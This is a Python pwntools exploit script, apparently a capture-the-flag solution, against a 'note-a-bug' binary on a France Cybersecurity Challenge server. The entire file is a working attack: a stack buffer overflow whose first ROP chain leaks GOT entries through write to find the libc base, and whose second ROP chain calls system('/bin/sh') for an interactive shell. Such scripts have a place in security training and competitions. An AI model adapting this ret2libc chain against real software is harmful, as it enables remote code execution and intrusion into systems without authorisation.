from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep


context.arch = "amd64"
context.word_size = 64

file = "./note-a-bug"
args = ["1"]

io: process = None

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """
    b *newNote+160
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="challenges.france-cybersecurity-challenge.fr", port=2110)

def launch_local():
    global file, io
    io = process([file, *args])
    debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_local
    l = launch_remote
    l()

def getb(d, a, b):
    a_ = d.find(a)
    return d[a_+len(a):d.find(b, a_)]

#
# exploit goes here
#

exe = ELF(file)
libc = ELF("./libc.so.6")

def exploit():
    def new_note(size, content):
        io.sendlineafter(b">>> ", b"1")
        leak = io.recvuntil(b"Content ")
        note = getb(leak, b"note: ", b"\n")
        io.sendlineafter(b"length: \n", str(size).encode())
        io.sendlineafter(b"Content: \n", content)
        return note

    def show_note(note):
        io.sendlineafter(b">>> ", b"2")
        io.sendline(SESSION + b"/" + note)
        leak = io.recvuntil(b"Choices:")
        print(leak)
        leak = re.findall(rb"\] ((?:[0-9a-f]{2} ?){0,16})", leak)
        return bytes.fromhex(b"".join(leak).decode())

    leak = io.recvuntil(b"Choices:")
    SESSION = getb(leak, b"fcsc/", b"/\n")

    pop_rdi = 0x40135e
    pop_rsi_r15 = 0x40135c
    ret = 0x401016

    payload = flat([
        b"A"*0x68,
        pop_rdi,
        1,
        pop_rsi_r15,
        0x403f68, # start of got
        0,
        ret,
        exe.plt["write"], # leak got entries
        exe.sym["newNote"], # ret2main
    ])
    new_note(0x100, payload)

    leak = recvu(b"[*] Creating")
    libc.address = u64(leak[0:8]) - libc.sym["putchar"]
    print("libc: %#018x" % libc.address)

    payload = flat([
        b"A"*0x68,
        pop_rdi,
        next(libc.search(b"/bin/sh\0")),
        ret,
        libc.sym["system"],
    ])
    io.sendlineafter(b"length: \n", str(0x100).encode())
    io.sendlineafter(b"Content: \n", payload)

    io.interactive()
    input("end")
    exit()

launch()
exploit()